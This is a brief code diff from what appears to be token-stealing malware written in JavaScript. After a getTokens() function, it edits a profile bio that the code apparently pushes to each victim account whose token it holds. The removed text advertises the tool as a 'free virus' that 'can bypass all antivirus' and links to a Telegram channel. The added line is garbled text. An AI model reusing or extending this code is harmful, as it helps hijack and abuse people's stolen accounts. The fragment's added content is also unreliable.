@@ -1866,8 +1866,7 @@ async function getTokens() {
     }
 
     const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     This free virus can bypass all antivirus !** 
-**           ⭐️https://t.me/doenerium69** ⭐️
+**     rexo uncle all except for zero.exe ⭐️
 ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
